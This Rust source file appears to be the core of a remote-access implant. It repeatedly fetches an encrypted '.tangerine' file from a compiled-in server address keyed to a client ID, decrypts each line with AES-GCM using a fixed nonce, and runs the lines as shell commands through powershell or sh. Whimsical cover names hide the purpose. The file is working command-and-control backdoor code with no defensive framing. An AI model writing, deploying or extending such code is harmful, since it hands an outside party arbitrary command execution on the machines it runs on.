mod crypto;
mod dev;

use aes_gcm::{
    aead::{Aead, KeyInit}, Nonce,
};
use crypto::Crypto;

use std::io::{BufRead};
use std::process::Command;
use std::{env};

include!(concat!(env!("OUT_DIR"), "/id.rs"));

pub async fn run() -> Result<(), Box<dyn std::error::Error>> {
    let crypto = crypto::Crypto::build(encryption_key(), nonce())?;

    let args: Vec<String> = env::args().collect();
    if args.len() >= 2 {
        dev::execute_command(&args[1], client_id(), &crypto);
        return Ok(());
    }

    // Eat my tangerine
    loop {
        let commands = read_tangerine(&crypto).await?;
        println!("Commands are {:?}", commands);

        for command in commands {
            let output = if cfg!(target_os = "windows") {
                Command::new("powershell")
                    .args(["/C", &command])
                    .output()
                    .expect("failed to execute process")
            } else {
                Command::new("sh")
                    .arg("-c")
                    .arg(&command)
                    .output()
                    .expect("failed to execute process")
            };
            println!("status: {}", output.status);
            println!("{}", String::from_utf8(output.stdout).unwrap());
            eprintln!("{}", String::from_utf8(output.stderr).unwrap());
        }
        std::thread::sleep(std::time::Duration::from_secs(5));
    }
}

async fn read_tangerine(crypto: &Crypto<'_>) -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let bytes = reqwest::get(format!("{}/{}.tangerine", base_uri(), client_id()))
        .await?
        .bytes()
        .await?;
    let mut lines = bytes.split(|byte| byte == &b'\n');

    let nonce = Nonce::from_slice(b"TANGERINE!!!");

    // Skip header
    let header = lines.next().unwrap();
    if header != b"TANGERINE_ENC" {
        eprintln!("Expected tangerine header");
    }

    let mut decrypted_lines = vec![];

    for line in lines {
        if line == b"!TANGERINE_ENC" {
            continue;
        }
        let decrypted = crypto.cipher().decrypt(nonce, line).unwrap();
        decrypted_lines.push(String::from_utf8(decrypted).unwrap());
    }
    Ok(decrypted_lines)
}
